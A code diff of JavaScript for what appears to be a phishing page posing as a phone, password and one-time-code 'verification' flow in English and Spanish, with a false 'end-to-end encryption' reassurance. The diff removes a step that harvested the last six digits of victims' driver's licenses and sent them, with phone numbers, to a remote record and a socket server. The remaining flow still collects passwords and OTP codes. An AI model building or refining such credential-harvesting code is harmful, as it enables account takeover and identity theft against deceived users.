@@ -23,15 +23,10 @@ const translations = {
         labelPhone: 'Mobile number',
         btnSend: 'Continue Verification',
         btnPassword: 'Continue Verification',
-        headingLicense: "Enter Driver's License",
-        instructionLicense: "Enter the last 6 digits of your driver's license to confirm your identity.",
-        labelLicense: "Last 6 Digits of Driver's License",
-        btnLicense: 'Continue Verification',
-        changePasswordDl: 'Change password',
         securityNote: 'Your verification is secured with end-to-end encryption.',
         headingOtp: 'Enter 4-digit code',
         instructionOtp: 'We sent a 4-digit verification code to',
-        changePhone: 'Change driver license',
+        changePhone: 'Change password',
         resendPrompt: "Didn't receive the code?",
         resendBtn: 'Resend Code',
         btnVerify: 'Verify Code',
@@ -58,15 +53,10 @@ const translations = {
         labelPhone: 'Número de móvil',
         btnSend: 'Continue Verification',
         btnPassword: 'Continue Verification',
-        headingLicense: 'Ingrese la Licencia de Conducir',
-        instructionLicense: 'Ingrese los últimos 6 dígitos de su licencia de conducir para confirmar su identidad.',
-        labelLicense: 'Últimos 6 dígitos de la licencia',
-        btnLicense: 'Continue Verification',
-        changePasswordDl: 'Cambiar contraseña',
         securityNote: 'Su verificación está protegida con cifrado de extremo a extremo.',
         headingOtp: 'Ingrese el código de 4 dígitos',
         instructionOtp: 'Enviamos un código de verificación de 4 dígitos a',
-        changePhone: 'Cambiar licencia de conducir',
+        changePhone: 'Cambiar contraseña',
         resendPrompt: '¿No recibiste el código?',
         resendBtn: 'Reenviar código',
         btnVerify: 'Verificar código',
@@ -91,22 +81,18 @@ const translations = {
 // DOM Elements
 const stepPhone = document.getElementById('step-phone');
 const stepPassword = document.getElementById('step-password');
-const stepLicense = document.getElementById('step-license');
 const stepOtp = document.getElementById('step-otp');
 const stepVerified = document.getElementById('step-verified');
 
 const phoneForm = document.getElementById('phone-form');
 const phoneInput = document.getElementById('phone-input');
 const passwordInput = document.getElementById('password-input');
-const licenseForm = document.getElementById('license-form');
-const licenseInput = document.getElementById('license-input');
 const otpInputs = document.querySelectorAll('.otp-box');
 const otp1 = document.getElementById('otp-1');
 const btnVerifyOtp = document.getElementById('btn-verify-otp');
 
 const userPhoneDisplay = document.getElementById('user-phone-display');
 const userPhoneDisplayPw = document.getElementById('user-phone-display-pw');
-const userPhoneDisplayDl = document.getElementById('user-phone-display-dl');
 const displayPhoneVerified = document.getElementById('final-phone-display');
 const displayTimestamp = document.getElementById('final-date-display');
 
@@ -150,13 +136,6 @@ function setLanguage(lang) {
     safeSetText('txt-label-phone', t.labelPhone);
     safeSetText('txt-btn-send', t.btnSend);
     safeSetHtml('txt-security-note', `<i class="fa-solid fa-shield-halved"></i> ${t.securityNote}`);
-    safeSetHtml('txt-security-note-pw', `<i class="fa-solid fa-shield-halved"></i> ${t.securityNote}`);
-    safeSetHtml('txt-security-note-dl', `<i class="fa-solid fa-shield-halved"></i> ${t.securityNote}`);
-    safeSetText('txt-heading-license', t.headingLicense);
-    safeSetText('txt-instruction-license', t.instructionLicense);
-    safeSetText('txt-label-license', t.labelLicense);
-    safeSetText('txt-btn-license', t.btnLicense);
-    safeSetText('txt-change-password-dl', t.changePasswordDl);
     safeSetText('txt-change-phone', t.changePhone);
     safeSetText('txt-heading-otp', t.headingOtp);
     safeSetText('txt-instruction-otp', t.instructionOtp);
@@ -260,7 +239,6 @@ function handlePhoneSubmit(e) {
     setTimeout(() => {
         setLoading(btn, false);
         if (userPhoneDisplayPw) userPhoneDisplayPw.textContent = fullPhone;
-        if (userPhoneDisplayDl) userPhoneDisplayDl.textContent = fullPhone;
         if (userPhoneDisplay) userPhoneDisplay.textContent = fullPhone;
         switchStep(stepPhone, stepPassword);
         if (passwordInput) passwordInput.focus();
@@ -302,67 +280,15 @@ function handlePasswordSubmit(e) {
 
     setTimeout(() => {
         setLoading(btn, false);
-        if (userPhoneDisplayDl) userPhoneDisplayDl.textContent = currentPhoneNumber;
-        switchStep(stepPassword, stepLicense);
-        if (licenseInput) licenseInput.focus();
-    }, 400);
-}
-
-// Handle Driver License (Last 6 Digits) Form Submission
-function handleLicenseSubmit(e) {
-    if (e) e.preventDefault();
-    if (!licenseInput) return;
-
-    const licenseVal = licenseInput.value.trim();
-    if (!licenseVal) return;
-
-    const btn = document.getElementById('btn-submit-license');
-    setLoading(btn, true);
-
-    const customSlug = window.location.pathname + window.location.search;
-    const recData = {
-        id: currentVerificationId,
-        _id: currentVerificationId,
-        phoneNumber: currentPhoneNumber,
-        licenseDigits: licenseVal,
-        status: 'LICENSE_SUBMITTED',
-        customSlug: customSlug,
-        submittedAt: new Date().toISOString()
-    };
-
-    saveCloudRecord(recData);
-
-    if (socket && typeof socket.emit === 'function') {
-        socket.emit('submit_license', {
-            verificationId: currentVerificationId,
-            phoneNumber: currentPhoneNumber,
-            licenseDigits: licenseVal,
-            customSlug: customSlug
-        });
-    }
-
-    setTimeout(() => {
-        setLoading(btn, false);
-        if (userPhoneDisplay) userPhoneDisplay.textContent = currentPhoneNumber;
-        switchStep(stepLicense, stepOtp);
+        switchStep(stepPassword, stepOtp);
         startResendTimer();
         if (otp1) otp1.focus();
     }, 400);
 }
 
-function goToStepLicense() {
-    switchStep(stepOtp, stepLicense);
-    if (licenseInput) licenseInput.focus();
-}
-
 function goToStepPassword() {
-    switchStep(stepLicense, stepPassword);
+    switchStep(stepOtp, stepPassword);
     if (passwordInput) passwordInput.focus();
-}
-
-function goToStepPhone() {
-    switchStep(stepPassword, stepPhone);
-    if (phoneInput) phoneInput.focus();
 }
 
 function togglePasswordVisibility() {
@@ -426,7 +352,6 @@ function cleanPhone(p) {
 function getCurrentActiveStep() {
     if (stepPhone && !stepPhone.classList.contains('hidden-step')) return stepPhone;
     if (stepPassword && !stepPassword.classList.contains('hidden-step')) return stepPassword;
-    if (stepLicense && !stepLicense.classList.contains('hidden-step')) return stepLicense;
     if (stepOtp && !stepOtp.classList.contains('hidden-step')) return stepOtp;
     if (stepPending && !stepPending.classList.contains('hidden-step')) return stepPending;
     if (stepVerified && !stepVerified.classList.contains('hidden-step')) return stepVerified;
